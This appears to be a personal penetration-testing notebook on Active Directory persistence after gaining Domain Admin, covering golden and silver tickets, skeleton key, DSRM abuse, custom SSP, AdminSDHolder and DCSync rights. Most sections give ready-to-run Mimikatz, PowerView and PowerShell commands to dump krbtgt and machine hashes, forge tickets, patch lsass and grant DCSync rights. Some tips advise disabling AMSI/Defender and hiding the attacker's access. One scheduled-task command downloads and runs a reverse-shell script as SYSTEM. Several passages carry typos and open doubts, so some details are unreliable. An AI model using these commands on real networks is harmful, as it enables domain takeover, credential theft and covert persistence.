# AD - Domain Dominance / Persistence

## Basics

* Once we have DA - new persistence is possible => escalation to Enterprise Admin and attacks across trusts
* Abusing trusts within domain, across domains and forests
* NTLM hash vor Kerberos are RC4, DES (both old) or AES encrypted&#x20;
* Kerberos policy only checked when TGT is created
* DC validates user account only when TGT > 20min
* Service Ticket (TGS) PAC is optional and not very often used
  * Server LSASS sends PAC validation request to DC netlogon service (NRPC)
  * It runs as servce, PAC validation is optional (disabled)
  * If a service runs as Syste, it performs server signature verification on the PAC (Computer account long-term key)

**How Kerberos works**

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

1. Password converted to NTLM hash. A Timestamp is encrypted and signed with the NTLM hash of the Users Password and sent to the KDC (AS-REQ)
2. The TGT (Ticket granting ticket) is generated and encrypted & signed with the NTLM Hash of krbtgt hash
3. The TGT is sent back to DC, because client can not decrypt it. Client Request a TGS (Ticket granting service). \
   The DC assumes whatever is inside the TGT, as long as it can be decrypted with krbtgt, it is assumed to be valid.\
   ❓Up to 20 Minutes the TGT is valid?
4. The TGS is returned with encryption of the target service/application service's NTLM hash
5. The Applicatoin Server decrypts the TGS because it is with its own service NTLM hash encrypted, and then decides whether user can access

## 🥇🎫Golden Ticket Attack

### Description

* Abuse is in Step 3 and 4, where a valid TGT is generated&#x20;
* A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket
* Since user account validation is not done by DC until TGT is older than 20min, we use even deleted/revoked accounts
* The krbtgt user hash could be used to impersonate any user with any privilege from even a non-domain machine
* Password change (of krbtgt account)has no effect on this attack because previous hash will also be accpeted - you have to change the pw of krbtgt twice

### Requirements

* krbtgt Hash has to be known

### Tools

**Execute Mimikatz on DC to get krbtgt hash - required DA privs**\
Invoke-Mimikatz -command '"lsadump:lsa /patch" -computername dc-hostname

&#x20;With powershell session on dc:\
$sess = New-Session -Computername dc.local\
Disable AMSI/Defender in that session\
Exit\
Invoke-command -session $ses -filepath C:\invoke-mimikatz.ps1\
Enter-Pssession  -session $sess\
Invoke-Mimikatz -command '"lsadump:lsa /patch\


**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs:**\
Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'

**Overpass the hash to start powershell**\
Invoke-Mimikatz -command '"sekurlsa:pth /user:svcadmin /domain:dom.local /ntlm:hash /run:powershell.exe"'



**Create a golden ticket when we have the krbtgt hash extracted from above** \
****Invoke-Mimikatz - command '"kerberos::golden /User:Administrator /domain:dom.local /sid:S-1-5-21-..... /krbtgt:hash.... id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

Use DCsync Attack / more silent in DC Logs

## 🥈🎫Silver Ticket Attack

### Description

* Step 5 is abused (AP-REQ)
* Trust anchor/key is the NTLM Hash of the Service Account of the application server. You can then access the service by impersonating any user, also high privs User
* A Silver Ticket is a valid TGS
* Encrypted and signed NTLM hash of the service account of the service running with that account
* Service rareley chekcs PAC (Privileged Attriute Certificate) - if it is enabled (default disabled), Silver Ticket Attack will fail
* Services will allow access only to the service themeselves
* ❓ Resonable persistence period (default 30 days for computer accounts) - but machine can request ist earlier or later - disable the change of machine password is also possible
* Interesting Service Accounts: CIFS, host, rpcss (can be used by WMI),wsman (powershell remoting) - all of them use the machine account as their service account

### Requirement

Machine account hash (e.g. after krbtgt&#x20;

### Tools

**Get domain controller account hash**\
Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:cifs /rc4:hash /user:Administrator /ptt"'

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
* Target is the host from where whe have the service account hash
* Using "cifs" service for later access the filesystem of the Server
* Using "host" service allows to schedule tasks then on the target host
* List of SPN which can be used: https://adsecurity.org/?page\_id=183&#x20;
{% endhint %}

**Schedudle an execute a task with silver ticket of "HOST" Service**

schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke\_powerShellTcp.ps1''')'"

schtasks /Run /S hostname.dom.local /TN "STCheck"

{% hint style="info" %}
* Attention: Within Download String these are two '
* STCheck is the Name of the task you create
{% endhint %}

**List tasks**\
****schtasks /S hostname.dom.local

## 🦴Skeleton Key

### Description

* Skeleton KEy is a persistance technique whewre it is possible to patch a Domain Controllers lsass process, that it allows access ans any user with a single password.
* The regular Password and the new password will work
* Malware named "Skeleton Key" used it
* Not persistent after reboot/lsass process restart
* You can access other machines, which authenticate to this DC
* You can not patch lsass twice, reboot is required

### Requirements

* Needs DA rights

### Tools

**Inject a skeleton key, password will be mimikatz - DA rights required**\
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc-hostname.dom.local

Now you can login e.g. with Enter-PSSession

❓Debug really needed?

{% hint style="info" %}
If lsass runs as protected process/protected process light, skeleton key can still be used. We need to use the mimikatz driver (mimidriv.sys) on the disk of the target DC:

mimikatz#privilege::debug\
mimikatz# !+\
mimikatz# !processprotect /process:lsass.exe /remove\
mimikatz# misc::skeleton\
mimikatz# !-

Noisy in logs - Service Installation for a kernel mode driver will be displayed

❓(Still work??) => This will install kernel mode driver
{% endhint %}



## 🔤Directory Service Restore Mode (DSRM) Attack

### Description

* Directory Service Restore Mode is used, when the DC is booted into "safe mode"&#x20;
* The local Administrator on every DC is called "Administrator" whose password is the DSRM PW - it is not the RID 500 User
* DSRM Password (SafeModePassword) is required when a server is promoted to Domain Controller and is rarely changed
* After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC
* Persistence: Very long! DSRM Password is set when DC is promoted, so very long.

### Requirements

* DA privileges are required
* Default: The local Administrator (DSRM Administrator) is default wise not allowed to log on over the network

### Tools

**Dump DSRM password - needs DA privs**\
Invoke-Mimikatz - Command '"token::elevate" "lsadump::sam"' -computername dchostname.dc.local\
\=> Here we take it from SAM hive (only local users), this is the DSRM local Administrator Password

Compare the Administrator hash with the Administrator hash of the below command\
Invoke-Mimikatz - Command '"lsadump:lsa /patch"' -computername dchostname.dc.local\
\=> Here we that it from the lsass process => This is the Administrator account of the Domain

**Change the logon behaviour of the DSRM Account before we can use the DSRM Hash**\
Enter-PSsession -computername dchostname.dc.local\
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\\" - name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD\
\-or if it already exist -\
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\\" - name "DsrmAdminLogonBehavior" -Value 2\
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\\"

**Later we can us the following command to get DA back**\
****Invoke-Mimikatz -command '"sekurlsa::pth /domain:!domaincontroller-name-here! /user:Administrator /ntlm:ntlm-hash-of-dsrm /run:powershell.exe\
ls \\\dc\c$

## 🐶Custom Security Support Provider (SSP)

### Description

* SSP is a DLL which provides ways fot an application to obtain an authenticated connection. Examples from SSP provided by Microsoft: NTLM, Kerberost, Wdigest, CredSSP
* Mimikatz provides custom SSP - mimilib.dll - This logs local logons, service account and machine account passwords in clear text on the targer server



### Requirement

* DA requires

### Tools

**Way1: Drop the mimilib.dll to C:\Windows\System32 an add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages**\
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -name 'Security Packages' | select -expandproperty 'security packages'\
$packages += "mimilib"\
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -name 'Security Packages' -value $packages\
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -name 'Security Packages' -value $packages\
Reboot the server\
All logons on the DC are logged to C:\Windows\system32\kiwissp.log

**Way2: Using mimikatz, inject into lsass (not stable with Server 2016/sometimes it works) / injects into lsass** \
Invoke-Mimikatz -command '"misc::memssp"'\
No reboot required\
All logons on the DC are logged to C:\Windows\system32\kiwissp.log

**mimilib.dll can be edited that the output is written in any directory e.g. SYSVOL or similar**

## 🔑ACLs - AdminSDHolder

### Description

* AdminSDHolder is a special container on the DC (MMC AD users\&computers/System/AdminSDHolder / Properties)
* Resides in the System container of a domain and used to control the permissions, using an ACL, for certain built-in privileged groups (called Protected Groups)
* ❓ AdminSDHolder its own ACL is used for Protected Groups
* Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of Protected Groups/AdminSDholder and overwrites all members of Protected Group ACLs with the ACLs of the AdminSDholder
* Protected groups: Domain Admins, Administrators, Enterpse Admins, Domain Controllers, Read-only Domain Controllers, Schema AdminsAccount Operators, Backup Operators, Server Operators, Print Operators, Replicator\
  ❓ Protected User group as well
*   Well known abuse of proteced groups - see following permissions\


    <figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### Requirements

* DA permissions required

### Tools

**Attack**\
****Modify the Permissions of AdminSDholder and add your Account as member via GUI or remotly

Add FullControl permissions for a user to the AdminSDHolder using PowerView as DomainAdmin:\
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName yourusername -Rigths All -verbose

Using ActiveDirectory Moduel and Set-ADACL:\
Set-ADACL -DistinguisedName 'CN=AdminSDHolder,CN=System,DC=subdom,DC=dom,DC=local' -Principal yourusername -verbose

Do the propagtion:\
$sess = NewPsSession -computername dchostn.local\
Invoke-Command -filepath .\Invoke-SDPropagator.ps -sessoin $sess\
Enter-pssession -sesion $sess\
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

**Get ACL of an Object for a specific user**\
****. .\PowerView.ps1\
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDS | ?{$\_.IdentityReference -atch 'username'}\
\==> ActiveDirectoryRights: GenericAll => so you have full rights to domain

Using AD Module\
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=subdom,DC=dom,DC=local').Access | ?{$\_.IdentityReference -match 'username'}&#x20;

**Add Member to Domain Group**\
. .\PowerView\_dev.ps1\
Add-DomainGroupMember -identity 'domain admins' -members yourusername -verbose

Using AD Module\
Add-ADGroupMember -identity 'domain admins' -members yourusername -verbose

**ResetPassword using PowerView\_dev**\
Set-DomainUserPassword -identity yourusername -accountpassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) - Verbose\
\
Using AD Module\
Set-ADAccountPassword -Identity yourusername -newPassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) - Verbose

**Run SDpropgator to apply the AdminSDHolder on all the Protected Groups**\
****. .\Invoke-SDPropagator\
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

❗Remember to add your user to other protected groups to be stealthier

## 🔑ACL - Right Abuse / DCSync&#x20;

### Description

* ACL of the domain root itself to be modifed to provide rights like FullControl or "DCSync"
* Default logging for modifications on the domain object itself is enabled

### Requirement

* DA permissions required

### Tools

**Add FullControl rights to Domain Object**\
Add-ObjectAcl -TargetDistinguisedName 'DC=subodmain,DC=domain,DC=local' -PrincipalSamAccountName yourusername -Rights All -verbose

Using AD Module\
Set-ADACL -DistinguishedName 'DC=subodmain,DC=domain,DC=local' -principal yourusername -verbose

**Add DCSync rights**\
****Add-ObjectAcl -TargetDistinguisedName 'DC=subodmain,DC=domain,DC=local' -PrincipalSamAccountName yourusername -Rights DCSync -verbose

Using AD Module\
Set-ADACL -DistinguishedName 'DC=subodmain,DC=domain,DC=local' -principal yourusername -GUIDRight DCSync -verbose

In the GUI they are called Replicating Directory Changes, Replicating Direcotry Changes All, Replicating Directory Changes In Filtered Set => All three are needed for DCSync

DCSync in general very interesting because no commands need to be excuted on the DC itself after the initial attack

Execute DCSync\
Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'\
\=> Other accounts such as dom\Administrator etc. or any other user who have DCSync rights

## 🔑ACLs - Security Descriptors





